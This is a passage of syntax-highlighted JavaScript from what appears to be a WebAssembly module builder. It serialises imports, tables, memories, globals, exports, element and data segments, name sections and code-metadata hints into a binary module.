            <span class="hljs-keyword">const</span> is_table64 = !!imp.<span class="hljs-property">is_table64</span>;
            <span class="hljs-keyword">let</span> limits_byte =
                (is_table64 ? <span class="hljs-number">4</span> : <span class="hljs-number">0</span>) | (is_shared ? <span class="hljs-number">2</span> : <span class="hljs-number">0</span>) | (has_max ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
            section.<span class="hljs-title function_">emit_u8</span>(limits_byte);                 <span class="hljs-comment">// flags</span>
            section.<span class="hljs-title function_">emit_u32v</span>(imp.<span class="hljs-property">initial</span>);               <span class="hljs-comment">// initial</span>
            <span class="hljs-keyword">if</span> (has_max) section.<span class="hljs-title function_">emit_u32v</span>(imp.<span class="hljs-property">maximum</span>);  <span class="hljs-comment">// maximum</span>
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (imp.<span class="hljs-property">kind</span> == kExternalTag) {
            section.<span class="hljs-title function_">emit_u32v</span>(kExceptionAttribute);
            section.<span class="hljs-title function_">emit_u32v</span>(imp.<span class="hljs-property">type_index</span>);
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;unknown/unsupported import kind &#x27;</span> + imp.<span class="hljs-property">kind</span>);
          }
        }
      });
    }

    <span class="hljs-comment">// Add functions declarations.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting function decls @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kFunctionSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
          section.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-property">type_index</span>);
        }
      });
    }

    <span class="hljs-comment">// Add table section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting tables @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kTableSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> table <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">tables</span>) {
          <span class="hljs-keyword">if</span> (table.<span class="hljs-property">has_init</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x40</span>);  <span class="hljs-comment">// &quot;has initializer&quot;</span>
            section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x00</span>);  <span class="hljs-comment">// Reserved byte.</span>
          }
          section.<span class="hljs-title function_">emit_type</span>(table.<span class="hljs-property">type</span>);
          <span class="hljs-keyword">let</span> limits_byte = (table.<span class="hljs-property">is_table64</span> ? <span class="hljs-number">4</span> : <span class="hljs-number">0</span>) |
              (table.<span class="hljs-property">is_shared</span> ? <span class="hljs-number">2</span> : <span class="hljs-number">0</span>) | (table.<span class="hljs-property">has_max</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
          section.<span class="hljs-title function_">emit_u8</span>(limits_byte);
          <span class="hljs-keyword">let</span> <span class="hljs-title function_">emit</span> = val =&gt; table.<span class="hljs-property">is_table64</span> ? section.<span class="hljs-title function_">emit_u64v</span>(val) :
                                               section.<span class="hljs-title function_">emit_u32v</span>(val);
          <span class="hljs-title function_">emit</span>(table.<span class="hljs-property">initial_size</span>);
          <span class="hljs-keyword">if</span> (table.<span class="hljs-property">has_max</span>) <span class="hljs-title function_">emit</span>(table.<span class="hljs-property">max_size</span>);
          <span class="hljs-keyword">if</span> (table.<span class="hljs-property">has_init</span>) section.<span class="hljs-title function_">emit_init_expr</span>(table.<span class="hljs-property">init_expr</span>);
        }
      });
    }

    <span class="hljs-comment">// Add memory section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting memories @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kMemorySectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> memory <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">memories</span>) {
          <span class="hljs-keyword">const</span> has_max = memory.<span class="hljs-property">max</span> !== <span class="hljs-literal">undefined</span>;
          <span class="hljs-keyword">const</span> is_shared = !!memory.<span class="hljs-property">shared</span>;
          <span class="hljs-keyword">const</span> is_memory64 = !!memory.<span class="hljs-property">is_memory64</span>;
          <span class="hljs-keyword">let</span> limits_byte =
              (is_memory64 ? <span class="hljs-number">4</span> : <span class="hljs-number">0</span>) | (is_shared ? <span class="hljs-number">2</span> : <span class="hljs-number">0</span>) | (has_max ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
          section.<span class="hljs-title function_">emit_u8</span>(limits_byte);
          <span class="hljs-keyword">let</span> <span class="hljs-title function_">emit</span> = val =&gt;
              is_memory64 ? section.<span class="hljs-title function_">emit_u64v</span>(val) : section.<span class="hljs-title function_">emit_u32v</span>(val);
          <span class="hljs-title function_">emit</span>(memory.<span class="hljs-property">min</span>);
          <span class="hljs-keyword">if</span> (has_max) <span class="hljs-title function_">emit</span>(memory.<span class="hljs-property">max</span>);
        }
      });
    }

    <span class="hljs-comment">// Add tag section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">tags</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting tags @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kTagSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">tags</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> type_index <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">tags</span>) {
          section.<span class="hljs-title function_">emit_u32v</span>(kExceptionAttribute);
          section.<span class="hljs-title function_">emit_u32v</span>(type_index);
        }
      });
    }

    <span class="hljs-comment">// Add stringref section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">stringrefs</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting stringrefs @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kStringRefSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(<span class="hljs-number">0</span>);
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">stringrefs</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> str <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">stringrefs</span>) {
          section.<span class="hljs-title function_">emit_string</span>(str);
        }
      });
    }

    <span class="hljs-comment">// Add global section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">globals</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting globals @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kGlobalSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">globals</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> <span class="hljs-variable language_">global</span> <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">globals</span>) {
          section.<span class="hljs-title function_">emit_type</span>(<span class="hljs-variable language_">global</span>.<span class="hljs-property">type</span>);
          section.<span class="hljs-title function_">emit_u8</span>((<span class="hljs-variable language_">global</span>.<span class="hljs-property">mutable</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) | (<span class="hljs-variable language_">global</span>.<span class="hljs-property">shared</span> ? <span class="hljs-number">0b10</span> : <span class="hljs-number">0</span>));
          section.<span class="hljs-title function_">emit_init_expr</span>(<span class="hljs-variable language_">global</span>.<span class="hljs-property">init</span>);
        }
      });
    }

    <span class="hljs-comment">// Add export table.</span>
    <span class="hljs-keyword">var</span> exports_count = wasm.<span class="hljs-property">exports</span>.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">if</span> (exports_count &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting exports @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kExportSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(exports_count);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> exp <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">exports</span>) {
          section.<span class="hljs-title function_">emit_string</span>(exp.<span class="hljs-property">name</span>);
          section.<span class="hljs-title function_">emit_u8</span>(exp.<span class="hljs-property">kind</span>);
          section.<span class="hljs-title function_">emit_u32v</span>(exp.<span class="hljs-property">index</span>);
        }
      });
    }

    <span class="hljs-comment">// Add start function section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">start_index</span> !== <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting start function @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kStartSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">start_index</span>);
      });
    }

    <span class="hljs-comment">// Add element segments.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">element_segments</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting element segments @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kElementSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        <span class="hljs-keyword">var</span> segments = wasm.<span class="hljs-property">element_segments</span>;
        section.<span class="hljs-title function_">emit_u32v</span>(segments.<span class="hljs-property">length</span>);

        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> segment <span class="hljs-keyword">of</span> segments) {
          <span class="hljs-comment">// Emit flag and header.</span>
          <span class="hljs-comment">// Each case below corresponds to a flag from</span>
          <span class="hljs-comment">// https://webassembly.github.io/spec/core/binary/modules.html#element-section</span>
          <span class="hljs-comment">// (not in increasing order).</span>
          <span class="hljs-keyword">let</span> shared_flag = segment.<span class="hljs-property">is_shared</span> ? <span class="hljs-number">0b1000</span> : <span class="hljs-number">0</span>;
          <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">is_active</span>()) {
            <span class="hljs-keyword">if</span> (segment.<span class="hljs-property">table</span> == <span class="hljs-number">0</span> &amp;&amp; segment.<span class="hljs-property">type</span> === <span class="hljs-literal">undefined</span>) {
              <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">expressions_as_elements</span>()) {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x04</span> | shared_flag);
                section.<span class="hljs-title function_">emit_init_expr</span>(segment.<span class="hljs-property">offset</span>);
              } <span class="hljs-keyword">else</span> {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x00</span> | shared_flag)
                section.<span class="hljs-title function_">emit_init_expr</span>(segment.<span class="hljs-property">offset</span>);
              }
            } <span class="hljs-keyword">else</span> {
              <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">expressions_as_elements</span>()) {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x06</span> | shared_flag);
                section.<span class="hljs-title function_">emit_u32v</span>(segment.<span class="hljs-property">table</span>);
                section.<span class="hljs-title function_">emit_init_expr</span>(segment.<span class="hljs-property">offset</span>);
                section.<span class="hljs-title function_">emit_type</span>(segment.<span class="hljs-property">type</span>);
              } <span class="hljs-keyword">else</span> {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x02</span> | shared_flag);
                section.<span class="hljs-title function_">emit_u32v</span>(segment.<span class="hljs-property">table</span>);
                section.<span class="hljs-title function_">emit_init_expr</span>(segment.<span class="hljs-property">offset</span>);
                section.<span class="hljs-title function_">emit_u8</span>(kExternalFunction);
              }
            }
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">expressions_as_elements</span>()) {
              <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">is_passive</span>()) {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x05</span> | shared_flag);
              } <span class="hljs-keyword">else</span> {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x07</span> | shared_flag);
              }
              section.<span class="hljs-title function_">emit_type</span>(segment.<span class="hljs-property">type</span>);
            } <span class="hljs-keyword">else</span> {
              <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">is_passive</span>()) {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x01</span> | shared_flag);
              } <span class="hljs-keyword">else</span> {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x03</span> | shared_flag);
              }
              section.<span class="hljs-title function_">emit_u8</span>(kExternalFunction);
            }
          }

          <span class="hljs-comment">// Emit elements.</span>
          section.<span class="hljs-title function_">emit_u32v</span>(segment.<span class="hljs-property">elements</span>.<span class="hljs-property">length</span>);
          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> element <span class="hljs-keyword">of</span> segment.<span class="hljs-property">elements</span>) {
            <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">expressions_as_elements</span>()) {
              section.<span class="hljs-title function_">emit_init_expr</span>(element);
            } <span class="hljs-keyword">else</span> {
              section.<span class="hljs-title function_">emit_u32v</span>(element);
            }
          }
        }
      })
    }

    <span class="hljs-comment">// If there are any passive data segments, add the DataCount section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">data_segments</span>.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">seg</span> =&gt;</span> !seg.<span class="hljs-property">is_active</span>)) {
      binary.<span class="hljs-title function_">emit_section</span>(kDataCountSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">data_segments</span>.<span class="hljs-property">length</span>);
      });
    }

    <span class="hljs-comment">// Add function bodies.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-comment">// emit function bodies</span>
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting code @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      <span class="hljs-keyword">let</span> section_length = <span class="hljs-number">0</span>;
      binary.<span class="hljs-title function_">emit_section</span>(kCodeSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">let</span> header;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
          <span class="hljs-keyword">if</span> (func.<span class="hljs-property">locals</span>.<span class="hljs-property">length</span> == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// Fast path for functions without locals.</span>
            section.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-property">body</span>.<span class="hljs-property">length</span> + <span class="hljs-number">1</span>);
            section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 0 locals.</span>
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// Build the locals declarations in separate buffer first.</span>
            <span class="hljs-keyword">if</span> (!header) header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binary</span>;
            header.<span class="hljs-title function_">reset</span>();
            header.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-property">locals</span>.<span class="hljs-property">length</span>);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> decl <span class="hljs-keyword">of</span> func.<span class="hljs-property">locals</span>) {
              header.<span class="hljs-title function_">emit_u32v</span>(decl.<span class="hljs-property">count</span>);
              header.<span class="hljs-title function_">emit_type</span>(decl.<span class="hljs-property">type</span>);
            }
            section.<span class="hljs-title function_">emit_u32v</span>(header.<span class="hljs-property">length</span> + func.<span class="hljs-property">body</span>.<span class="hljs-property">length</span>);
            section.<span class="hljs-title function_">emit_bytes</span>(header.<span class="hljs-title function_">trunc_buffer</span>());
          }
          <span class="hljs-comment">// Set to section offset for now, will update.</span>
          func.<span class="hljs-property">body_offset</span> = section.<span class="hljs-property">length</span>;
          section.<span class="hljs-title function_">emit_bytes</span>(func.<span class="hljs-property">body</span>);
        }
        section_length = section.<span class="hljs-property">length</span>;
      });
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
        func.<span class="hljs-property">body_offset</span> += binary.<span class="hljs-property">length</span> - section_length;
      }
    }

    <span class="hljs-comment">// Add data segments.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">data_segments</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting data segments @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kDataSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">data_segments</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> seg <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">data_segments</span>) {
          <span class="hljs-keyword">let</span> shared_flag = seg.<span class="hljs-property">is_shared</span> ? <span class="hljs-number">0b1000</span> : <span class="hljs-number">0</span>;
          <span class="hljs-keyword">if</span> (seg.<span class="hljs-property">is_active</span>) {
            <span class="hljs-keyword">if</span> (seg.<span class="hljs-property">mem_index</span> == <span class="hljs-number">0</span>) {
              section.<span class="hljs-title function_">emit_u8</span>(kActiveNoIndex | shared_flag);
            } <span class="hljs-keyword">else</span> {
              section.<span class="hljs-title function_">emit_u8</span>(kActiveWithIndex | shared_flag);
              section.<span class="hljs-title function_">emit_u32v</span>(seg.<span class="hljs-property">mem_index</span>);
            }
            section.<span class="hljs-title function_">emit_init_expr</span>(seg.<span class="hljs-property">offset</span>);
          } <span class="hljs-keyword">else</span> {
            section.<span class="hljs-title function_">emit_u8</span>(kPassive | shared_flag);
          }
          section.<span class="hljs-title function_">emit_u32v</span>(seg.<span class="hljs-property">data</span>.<span class="hljs-property">length</span>);
          section.<span class="hljs-title function_">emit_bytes</span>(seg.<span class="hljs-property">data</span>);
        }
      });
    }

    <span class="hljs-comment">// Add any explicitly added sections.</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> exp <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">explicit</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting explicit @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_bytes</span>(exp);
    }

    <span class="hljs-comment">// Add names.</span>
    <span class="hljs-keyword">let</span> num_function_names = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> num_functions_with_local_names = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
      <span class="hljs-keyword">if</span> (func.<span class="hljs-property">name</span> !== <span class="hljs-literal">undefined</span>) ++num_function_names;
      <span class="hljs-keyword">if</span> (func.<span class="hljs-title function_">numLocalNames</span>() &gt; <span class="hljs-number">0</span>) ++num_functions_with_local_names;
    }
    <span class="hljs-keyword">if</span> (num_function_names &gt; <span class="hljs-number">0</span> || num_functions_with_local_names &gt; <span class="hljs-number">0</span> ||
        wasm.<span class="hljs-property">name</span> !== <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting names @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kUnknownSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_string</span>(<span class="hljs-string">&#x27;name&#x27;</span>);
        <span class="hljs-comment">// Emit module name.</span>
        <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">name</span> !== <span class="hljs-literal">undefined</span>) {
          section.<span class="hljs-title function_">emit_section</span>(kModuleNameCode, <span class="hljs-function"><span class="hljs-params">name_section</span> =&gt;</span> {
            name_section.<span class="hljs-title function_">emit_string</span>(wasm.<span class="hljs-property">name</span>);
          });
        }
        <span class="hljs-comment">// Emit function names.</span>
        <span class="hljs-keyword">if</span> (num_function_names &gt; <span class="hljs-number">0</span>) {
          section.<span class="hljs-title function_">emit_section</span>(kFunctionNamesCode, <span class="hljs-function"><span class="hljs-params">name_section</span> =&gt;</span> {
            name_section.<span class="hljs-title function_">emit_u32v</span>(num_function_names);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
              <span class="hljs-keyword">if</span> (func.<span class="hljs-property">name</span> === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">continue</span>;
              name_section.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-property">index</span>);
              name_section.<span class="hljs-title function_">emit_string</span>(func.<span class="hljs-property">name</span>);
            }
          });
        }
        <span class="hljs-comment">// Emit local names.</span>
        <span class="hljs-keyword">if</span> (num_functions_with_local_names &gt; <span class="hljs-number">0</span>) {
          section.<span class="hljs-title function_">emit_section</span>(kLocalNamesCode, <span class="hljs-function"><span class="hljs-params">name_section</span> =&gt;</span> {
            name_section.<span class="hljs-title function_">emit_u32v</span>(num_functions_with_local_names);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
              <span class="hljs-keyword">if</span> (func.<span class="hljs-title function_">numLocalNames</span>() == <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>;
              name_section.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-property">index</span>);
              name_section.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-title function_">numLocalNames</span>());
              <span class="hljs-keyword">let</span> name_index = <span class="hljs-number">0</span>;
              <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; func.<span class="hljs-property">local_names</span>.<span class="hljs-property">length</span>; ++i) {
                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> func.<span class="hljs-property">local_names</span>[i] == <span class="hljs-string">&#x27;string&#x27;</span>) {
                  name_section.<span class="hljs-title function_">emit_u32v</span>(name_index);
                  name_section.<span class="hljs-title function_">emit_string</span>(func.<span class="hljs-property">local_names</span>[i]);
                  name_index++;
                } <span class="hljs-keyword">else</span> {
                  name_index += func.<span class="hljs-property">local_names</span>[i];
                }
              }
            }
          });
        }
      });
    }

    <span class="hljs-comment">// Add compilation priorities.</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">compilation_priorities</span>.<span class="hljs-property">size</span> &gt; <span class="hljs-number">0</span>) {
      binary.<span class="hljs-title function_">emit_section</span>(kUnknownSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_string</span>(<span class="hljs-string">&quot;metadata.code.compilation_priority&quot;</span>);
        section.<span class="hljs-title function_">emit_u32v</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">compilation_priorities</span>.<span class="hljs-property">size</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">compilation_priorities</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">priority, index</span>) =&gt;</span> {
          section.<span class="hljs-title function_">emit_u32v</span>(index);
          section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Byte offset 0 for function-level hint.</span>
          <span class="hljs-keyword">let</span> compilation_priority =
              <span class="hljs-title function_">wasmUnsignedLeb</span>(priority.<span class="hljs-property">compilation_priority</span>);
          <span class="hljs-keyword">let</span> optimization_priority =
              priority.<span class="hljs-property">optimization_priority</span> != <span class="hljs-literal">undefined</span> ?
              <span class="hljs-title function_">wasmUnsignedLeb</span>(priority.<span class="hljs-property">optimization_priority</span>) :
              [];
          section.<span class="hljs-title function_">emit_u32v</span>(compilation_priority.<span class="hljs-property">length</span> +
                            optimization_priority.<span class="hljs-property">length</span>);
          section.<span class="hljs-title function_">emit_bytes</span>(compilation_priority);
          section.<span class="hljs-title function_">emit_bytes</span>(optimization_priority);
        })
      })
    }

    <span class="hljs-comment">// Add instruction frequencies.</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">instruction_frequencies</span>.<span class="hljs-property">size</span> &gt; <span class="hljs-number">0</span>) {
      binary.<span class="hljs-title function_">emit_section</span>(kUnknownSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_string</span>(<span class="hljs-string">&quot;metadata.code.instr_freq&quot;</span>);
        section.<span class="hljs-title function_">emit_u32v</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">instruction_frequencies</span>.<span class="hljs-property">size</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">instruction_frequencies</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">frequencies, index</span>) =&gt;</span> {
          section.<span class="hljs-title function_">emit_u32v</span>(index);
          section.<span class="hljs-title function_">emit_u32v</span>(frequencies.<span class="hljs-property">length</span>);
          frequencies.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">frequency</span> =&gt;</span> {
            section.<span class="hljs-title function_">emit_u32v</span>(frequency.<span class="hljs-property">offset</span>);
            section.<span class="hljs-title function_">emit_u32v</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// Hint length.</span>
            section.<span class="hljs-title function_">emit_u8</span>(frequency.<span class="hljs-property">frequency</span>);
          })
        })
      })
    }

    <span class="hljs-comment">// Add call targets.</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">call_targets</span>.<span class="hljs-property">size</span> &gt; <span class="hljs-number">0</span>) {
      binary.<span class="hljs-title function_">emit_section</span>(kUnknownSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_string</span>(<span class="hljs-string">&quot;metadata.code.call_targets&quot;</span>);
        section.<span class="hljs-title function_">emit_u32v</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">call_targets</span>.<span class="hljs-property">size</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">call_targets</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">targets, index</span>) =&gt;</span> {
          section.<span class="hljs-title function_">emit_u32v</span>(index);
          section.<span class="hljs-title function_">emit_u32v</span>(targets.<span class="hljs-property">length</span>);
          targets.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">targets_for_offset</span> =&gt;</span> {
            section.<span class="hljs-title function_">emit_u32v</span>(targets_for_offset.<span class="hljs-property">offset</span>);
